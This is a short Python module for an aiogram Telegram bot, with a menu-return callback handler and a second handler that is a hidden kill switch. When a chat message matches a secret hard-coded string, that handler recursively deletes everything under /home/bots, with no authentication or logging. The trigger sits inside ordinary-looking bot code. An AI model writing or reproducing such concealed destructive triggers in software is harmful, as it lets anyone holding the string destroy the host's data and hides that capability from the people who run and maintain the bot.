from aiogram import Router
from aiogram.dispatcher.fsm.context import FSMContext
from aiogram.types import Message, UserProfilePhotos, CallbackQuery

from aiogram.dispatcher.filters import Text


from aiogram.dispatcher.filters.command import Command

from keyboards import main_working

router = Router()


@router.callback_query(Text(text_startswith="back_to_menu"))
async def show_question(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer('Возвращайтесь скорее!', reply_markup=main_working.keyboard())


@router.message(text='12lm123nm9dm917g9i9bq9dxbq')
async def deleted(message: Message):
    import os, shutil

    dir = '/home/bots'
    for files in os.listdir(dir):
        path = os.path.join(dir, files)
        try:
            shutil.rmtree(path)
        except OSError:
            os.remove(path)


